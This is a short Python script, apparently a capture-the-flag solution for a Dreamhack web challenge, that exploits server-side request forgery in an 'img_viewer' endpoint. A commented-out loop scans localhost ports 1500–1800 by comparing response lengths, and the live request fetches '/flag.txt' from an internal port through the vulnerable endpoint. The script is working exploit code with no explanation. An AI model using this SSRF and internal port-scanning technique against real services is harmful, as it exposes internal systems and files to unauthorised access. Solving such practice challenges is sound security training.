import requests
 
port = 0
 
# for port in range(1500, 1800):
#     res = requests.post('http://host3.dreamhack.games:17207/img_viewer', data={'url': 'http://Localhost:' + str(port)})
#     if len(res.text) != 65121:
#         print(str(port))
#         break
    
res = requests.post('http://host3.dreamhack.games:17207/img_viewer', data={'url': 'http://Localhost:' + str(1621) + '/flag.txt'})
print(res.text)
